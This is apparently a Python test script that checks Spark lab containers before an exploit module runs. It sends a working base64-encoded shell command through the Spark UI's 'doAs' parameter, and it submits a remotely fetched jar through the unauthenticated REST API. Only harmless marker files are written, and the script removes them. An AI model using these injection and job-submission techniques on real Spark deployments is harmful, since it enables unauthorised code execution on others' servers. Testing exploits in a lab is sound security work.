"""Require native target behavior before any public Framework module dispatch."""
import base64
import json
import os
import urllib.parse

from client import SparkTarget


def identity(target, service, version):
    actual = target.cli('exec', '-T', service, '/opt/spark/bin/spark-submit', '--version')
    assert version in actual.stdout+actual.stderr, actual
    actual = target.cli('exec', '-T', service, 'id').stdout
    assert 'uid=1500(spark)' in actual and 'gid=1500(spark)' in actual, actual
    pid = target.cli('exec', '-T', service, 'pgrep', '-x', 'java').stdout.strip()
    assert pid.isdecimal(), pid
    environment = target.cli('exec', '-T', service, 'cat', '/proc/'+pid+'/environ').stdout.split('\0')
    assert 'SPARK_HOME=/opt/spark' in environment, environment
    assert 'SPARK_SCALA_VERSION=2.12' in environment, environment
    return {'version': version, 'identity': actual, 'vendor_scala_environment': True}


def injection(target, service, url, label, vulnerable, password=None):
    baseline = target.cli('exec', '-T', service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-printf', '%f\n').stdout
    records = []
    for iteration in range(2):
        path = f'/tmp/module-target-native-ui-{iteration}'
        marker = f'{label}->>>-literal-$HOME-{iteration}'
        command = f"printf '%s' '{marker}' > {path}"
        encoded = base64.b64encode(command.encode()).decode()
        assert '+' in encoded, encoded
        value = '`echo '+encoded+' | base64 -d | bash`'
        response = target.http(url, urllib.parse.urlencode({'doAs': value}).encode(), password=password)
        proof = target.cli('exec', '-T', service, 'cat', path, check=False)
        if vulnerable:
            assert response['status'] == 403, response
            assert proof.returncode == 0 and proof.stdout == marker, (response, proof)
            owner = target.cli('exec', '-T', service, 'stat', '-c', '%u:%g', path).stdout.strip()
            assert owner == '1500:1500', owner
            target.cli('exec', '-T', service, 'rm', '--', path)
        else:
            assert proof.returncode != 0, (response, proof)
        records.append({'status': response['status'], 'proof': proof.stdout, 'proof_exit': proof.returncode})
    after = target.cli('exec', '-T', service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-printf', '%f\n').stdout
    assert sorted(baseline.splitlines()) == sorted(after.splitlines()), service
    return records


def ui_controls(target):
    profiles = {}
    for service, version, vulnerable in [('affected','3.2.1',True),('fixed','3.2.2',False),('legacy','3.1.3',True),('disabled','3.2.1',False)]:
        profiles[service] = identity(target, service, version)
        url = target.endpoint(service, 8080)
        state = target.http(url+'/json/')
        assert state['status'] == 200 and json.loads(state['body'])['status'] == 'ALIVE', state
        profiles[service]['proofs'] = injection(target, service, url+'/', service, vulnerable)
    gateway = target.endpoint('gateway', 80)+'/spark-ui/'
    for password in (None, 'wrong-password'):
        response = target.http(gateway, password=password)
        assert response['status'] == 401, response
    response = target.http(gateway+'json/', password='module-test-password')
    assert response['status'] == 200 and json.loads(response['body'])['url']=='spark://affected:7077', response
    profiles['gateway'] = injection(target, 'affected', gateway, 'gateway', True, password='module-test-password')
    # Authorization filters can run before routing; native proof settles this
    # apparently missing URI rather than assuming it is a harmless negative.
    profiles['nonexistent_path'] = injection(target, 'affected', target.endpoint('affected',8080)+'/module-target-missing/', 'missing-path', True)
    unrelated = target.http(target.endpoint('unrelated',80)+'/')
    assert unrelated['status'] == 200 and 'Spark' not in unrelated['body'], unrelated
    return profiles


def rest_controls(target):
    profiles = {'affected': identity(target, 'affected', '3.2.1')}
    master = target.endpoint('affected',8080)
    rest = target.endpoint('affected',6066)
    version = target.http(rest+'/')
    assert version['status']==400 and json.loads(version['body'])['serverSparkVersion']=='3.2.1',version
    cluster = json.loads(target.http(master+'/json/')['body'])
    assert len(cluster['workers'])==1 and cluster['workers'][0]['state']=='ALIVE',cluster
    gateway = target.endpoint('gateway',80)+'/spark-rest/'
    for password in (None,'wrong-password'):
        response = target.http(gateway,password=password)
        assert response['status']==401,response
    response = target.http(gateway,password='module-test-password')
    assert response['status']==400 and json.loads(response['body'])['serverSparkVersion']=='3.2.1',response
    disabled=target.http(target.endpoint('disabled',6066)+'/')
    assert disabled['status'] is None,disabled
    assert target.http(target.endpoint('disabled',8080)+'/json/')['status']==200
    drivers=[]
    for iteration in range(2):
        path=f'/tmp/module-target-native-driver-{iteration}'
        payload={'action':'CreateSubmissionRequest','clientSparkVersion':'3.2.1','appArgs':[path],
                 'appResource':'http://artifacts:8082/native-proof.jar','environmentVariables':{'SPARK_ENV_LOADED':'1'},
                 'mainClass':'NativeProof','sparkProperties':{'spark.jars':'http://artifacts:8082/native-proof.jar',
                 'spark.driver.supervise':'false','spark.app.name':f'module-target-native-{iteration}',
                 'spark.eventLog.enabled':'true','spark.submit.deployMode':'cluster','spark.master':'spark://affected:6066'}}
        response=target.http(rest+'/v1/submissions/create',payload)
        result=json.loads(response['body'])
        assert response['status']==200 and result['success'],response
        driver=result['submissionId']
        def finished():
            state=json.loads(target.http(rest+'/v1/submissions/status/'+driver)['body'])
            assert state.get('driverState') not in ('ERROR','FAILED','KILLED'),state
            return state if state.get('driverState')=='FINISHED' else None
        state=target.wait(finished)
        proof=target.cli('exec','-T','worker','cat',path).stdout
        assert proof.startswith('spark\n1.8.0_'),proof
        owner=target.cli('exec','-T','worker','stat','-c','%u:%g',path).stdout.strip()
        assert owner=='1500:1500',owner
        target.cli('exec','-T','worker','rm','--',path)
        drivers.append({'id':driver,'state':state,'proof':proof,'owner':owner})
    profiles['drivers']=drivers
    return profiles


if __name__=='__main__':
    target=SparkTarget()
    profile=os.environ.get('SPARK_TARGET_PROFILE','ui')
    assert profile in ('ui','rest'),profile
    profiles=ui_controls(target) if profile=='ui' else rest_controls(target)
    print(json.dumps({'status':'passed','profile':profile,'profiles':profiles,'commands':len(target.commands),'http':len(target.requests)}))
